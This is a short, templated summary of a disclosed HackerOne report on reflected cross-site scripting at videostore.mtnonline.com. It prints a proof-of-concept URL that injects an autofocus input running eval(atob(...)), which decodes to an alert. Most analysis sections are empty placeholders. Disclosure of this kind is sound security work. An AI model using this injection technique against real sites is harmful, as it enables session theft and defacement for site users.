# XSS at videostore.mtnonline.com/GL/*.aspx via all parameters

## Metadata
- **Source:** HackerOne
- **Report:** 1244731 | https://hackerone.com/reports/1244731
- **Submitted:** 2021-06-26
- **Reporter:** homosec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
PoC
```
https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27><input%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus>
```

Symbols <"/'> are not filtered that alloweds to inject HTML code.
{F1353609}

## Impact

XSS at videostore.mtnonline.com

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

PoC
```
https://videostore.mtnonline.com/GL/MyAccount.aspx?PId=126&CID=5&OprId=11%27><input%20onfocus=eval(atob(%27YWxlcnQoJ1hTUycp%27))%20autofocus>
```

Symbols <"/'> are not filtered that alloweds to inject HTML code.
{F1353609}

## Impact

XSS at videostore.mtnonline.com

</details>

---
*Analysed by Claude on 2026-05-24*
